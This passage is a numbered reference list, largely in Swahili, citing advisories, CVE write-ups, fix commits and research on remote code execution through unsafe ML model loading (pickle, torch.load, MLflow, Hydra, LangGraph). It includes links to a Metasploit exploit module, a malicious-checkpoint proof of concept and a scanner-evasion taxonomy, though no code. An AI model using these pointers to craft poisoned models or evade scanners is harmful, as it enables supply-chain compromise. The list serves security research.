- [3] [Nyaraka za moduli ya Rapid7 Metasploit](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – mambo ya usalama kuhusu torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Blogu ya ZDI – CVE-2025-23298: Kupata Remote Code Execution katika NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Ushauri wa ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit ya marekebisho ya Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Loader hatarishi kabla ya marekebisho (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC ya checkpoint hasidi (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader baada ya marekebisho (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Remote Code Execution kupitia Miundo na Maktaba za Kisasa za AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Nyaraka za Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit ya block-list ya Hydra (onyo kuhusu RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Kutoka SQLi hadi RCE: Kutumia Checkpointer ya LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Kugeuza Hitilafu za Archive Slip kuwa Fursa za Bounty za AI/ML Zenye Thamani Kubwa](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Ushauri wa Snyk na proof of concept ya PyFunc – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [Chanzo cha MLflow – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – endpoints za kupakua na kupakia artifact](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
- [21] [Taxonomy ya kukwepa static scanner ya Binarly MLTracer](https://raw.githubusercontent.com/binarly-io/ai-supply-chain-attacks-research/master/MLTracer/evasion.md)
- [22] [Binarly – Kugundua Model Hasidi kwa MLTracer](https://binarly.io/blog/malicious-model-detection-mltracer)
- [23] [Utekelezaji wa PyTorch storage `_load_from_bytes`](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/storage.py)
- [24] [Ramani ya uoanifu ya CPython pickle `find_class`](https://raw.githubusercontent.com/python/cpython/main/Lib/pickle.py)
- [25] [Ramani ya uingizaji ya CPython `_compat_pickle`](https://raw.githubusercontent.com/python/cpython/main/Lib/_compat_pickle.py)
